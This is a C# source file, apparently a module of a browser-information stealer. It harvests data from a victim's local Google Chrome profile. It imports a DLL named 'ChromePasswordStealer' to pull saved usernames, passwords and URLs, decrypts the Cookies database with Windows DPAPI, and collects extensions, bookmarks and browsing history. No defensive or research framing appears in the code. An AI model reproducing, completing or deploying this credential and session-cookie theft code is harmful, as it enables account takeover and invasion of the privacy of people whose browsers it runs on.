using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using Newtonsoft;
using Newtonsoft.Json.Linq;
using Newtonsoft.Json;
using System.Security.Cryptography;

namespace Module_Browser_Info.Chrome
{
    /// <summary>
    /// get infromation from google chrome
    /// </summary>
    public class Chrome
    {
        /// <summary>
        /// Gets the chrome password from DLL.
        /// </summary>
        /// <returns>return string from _s_Module_Browser_Info_ChromePasswordStealer.dll contain user pass saved on google chrome</returns>
        [DllImport("_s_Module_Browser_Info_ChromePasswordStealer.dll", CallingConvention = CallingConvention.Cdecl)]
        [return: MarshalAs(UnmanagedType.BStr)]
        static extern string GetChromePasswordFromDLL();
        /// <summary>
        /// Gets the chrome passwords.
        /// </summary>
        /// <returns>call GetChromePasswordFromDLL from _s_Module_Browser_Info_ChromePasswordStealer and return string data</returns>
        public static string OnGetChromePasswords()
        {
            string Usernames_Passwords_Urls = GetChromePasswordFromDLL();
            return Usernames_Passwords_Urls;
        }

        /// <summary>
        /// Gets the chrome addon list.
        /// </summary>
        /// <returns>get string list of google chrome addons</returns>
        public static List<string> OnGetChromeAddonList()
        {
            List<string> AdodonsList = new List<string>();
            string ExtensionsPath = GetChromeProfilePaths();
            ExtensionsPath += "\\Extensions\\";
            if (!Directory.Exists(ExtensionsPath))
                return AdodonsList;
            string[] ExtensionDirs= Directory.GetDirectories(ExtensionsPath);

            foreach(string ExtensionDir in ExtensionDirs)
            {
                string[] ExtensionVersionDir = Directory.GetDirectories(ExtensionDir);               
                if (ExtensionVersionDir.Length>0)
                {
                    ExtensionVersionDir[0] += "\\manifest.json";
                    if (File.Exists(ExtensionVersionDir[0]))
                    {
                        using (StreamReader file = File.OpenText(ExtensionVersionDir[0]))
                        {
                            JsonSerializer serializer = new JsonSerializer();
                            JToken manifestFile = (JToken)serializer.Deserialize(file, typeof(JToken));
                            string  name = manifestFile["name"].ToString();
                            if (name.ToLower() != "__MSG_extensionName__".ToLower() && name.ToLower() != "__MSG_extName__".ToLower() && name.ToLower() != "__MSG_appName__".ToLower() && name.ToLower() != "__MSG_APP_NAME__".ToLower())
                            {
                                AdodonsList.Add(name);
                            }
                            else
                            {
                                name = ExtensionDir.Split('\\').Last();
                                AdodonsList.Add(name);
                            }
                        }
                    }
                }
            }

            return AdodonsList;
        }
        /// <summary>
        /// Gets the chrome cookies.
        /// </summary>
        /// <returns>get the list of chrome cookies</returns>
        public static List<BrowserCookie_Node> OnGetChromeCookies()
        {
            List<BrowserCookie_Node> Cookies = new List<BrowserCookie_Node>();
            string CookiesPath = GetChromeProfilePaths();
            CookiesPath += "\\Cookies";
            string strDb = "Data Source=" + CookiesPath + ";pooling=false";
            using (SQLiteConnection conn = new SQLiteConnection(strDb))
            {
                using (SQLiteCommand cmd = conn.CreateCommand())
                {
                    cmd.CommandText = "SELECT * FROM cookies";
                    conn.Open();
                    using (SQLiteDataReader sqlite_datareader = cmd.ExecuteReader())
                    {
                        while (sqlite_datareader.Read())
                        {
                            BrowserCookie_Node cookienode = new BrowserCookie_Node();
                            cookienode.baseDomain = sqlite_datareader["host_key"].ToString();
                            cookienode.name = sqlite_datareader["name"].ToString();                           
                            byte[] encrypted_value=(byte[]) sqlite_datareader["encrypted_value"];
                            string decoded_value =Encoding.ASCII.GetString(ProtectedData.Unprotect(encrypted_value, null, System.Security.Cryptography.DataProtectionScope.LocalMachine));
                            cookienode.value = decoded_value;
                            cookienode.expiry = BrowserHistory_Node.FromUnixTime(long.Parse(sqlite_datareader["expires_utc"].ToString()));
                            cookienode.lastAccessed = BrowserHistory_Node.FromUnixTime(long.Parse(sqlite_datareader["last_access_utc"].ToString()));
                            cookienode.creationTime = BrowserHistory_Node.FromUnixTime(long.Parse(sqlite_datareader["creation_utc"].ToString()));
                            
                            Cookies.Add(cookienode);
                        }
                    }
                    conn.Close();
                }
            }
                return Cookies;
        }

        /// <summary>
        /// Gets the chrome bookmarks.
        /// </summary>
        /// <returns>get the list of chrome bookmark</returns>
        public static List<BrowserHistory_Node> OnGetChromeBookmarks()
        {
            List<BrowserHistory_Node> URLs = new List<BrowserHistory_Node>();
            string BookmarksPath = GetChromeProfilePaths();
            BookmarksPath += "\\Bookmarks";
            if (File.Exists(BookmarksPath))
            {
                using (StreamReader file = File.OpenText(BookmarksPath))
                {
                    JsonSerializer serializer = new JsonSerializer();
                    JToken BookmarksFile = (JToken)serializer.Deserialize(file, typeof(JToken));
                    List<JToken> Bookmarks = BookmarksFile.FindTokens("children");
                    foreach (JToken Bookmark in Bookmarks)
                    {

                        if (Bookmark.Type == JTokenType.Array)
                        {
                            foreach (JToken child in Bookmark.Children())
                            {
                                foreach (JToken token in child.SelectTokens("$.url"))
                                {
                                    BrowserHistory_Node bookmarnode = new BrowserHistory_Node();
                                    string name = child["name"].ToString();
                                    string url = child["url"].ToString();
                                    string date_added = child["date_added"].ToString();
                                    bookmarnode.title = name;
                                    bookmarnode.url = url;
                                    bookmarnode.create = BrowserHistory_Node.FromUnixTime(long.Parse(date_added));
                                    URLs.Add(bookmarnode);
                                }
                            }
                        }
                    }
                }
            }
            return URLs;
        }
        /// <summary>
        /// Gets the chrome history.
        /// </summary>
        /// <returns>get list of chrome histroy</returns>
        public static List<BrowserHistory_Node> OnGetChromeHistory()
        {
            List<BrowserHistory_Node> URLs = new List<BrowserHistory_Node>();
            string HistoryPath= GetChromeProfilePaths();
            HistoryPath += "\\History";
            SQLiteConnection conn = new SQLiteConnection(@"Data Source="+ HistoryPath);
            conn.Open();
            SQLiteCommand cmd = new SQLiteCommand();
            cmd.Connection = conn;
            cmd.CommandText = "Select * From urls";
            SQLiteDataReader row = cmd.ExecuteReader();
            while (row.Read())
            {
                BrowserHistory_Node historynode = new BrowserHistory_Node();
                string last_visit_time = row["last_visit_time"].ToString();

                    historynode.lastvisit = BrowserHistory_Node.FromUnixTime(long.Parse(last_visit_time));

                // Obtain URL and Title strings


                historynode.url = row["Url"].ToString();
                historynode.title = row["title"].ToString();
                URLs.Add(historynode);
            }

            return URLs;
        }
        /// <summary>
        /// Gets the chrome profile paths.
        /// </summary>
        /// <returns>return profile path on system drive and local application path</returns>
        private static string GetChromeProfilePaths()
        {
            string apppath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            return apppath+ @"\Google\Chrome\User Data\Default";
        }
    }
}
